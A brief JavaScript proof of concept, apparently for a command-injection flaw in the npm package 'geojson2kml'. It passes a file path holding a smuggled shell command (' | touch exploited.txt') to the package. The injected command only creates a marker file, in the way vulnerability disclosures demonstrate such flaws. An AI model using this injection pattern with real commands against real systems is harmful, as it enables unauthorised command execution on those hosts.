const pkg = require('geojson2kml');

const payload = " | touch exploited.txt";

console.log(pkg);

const inPath = payload;
const outPath = payload;

const done = function(error, data) {

};

pkg(inPath, outPath, done)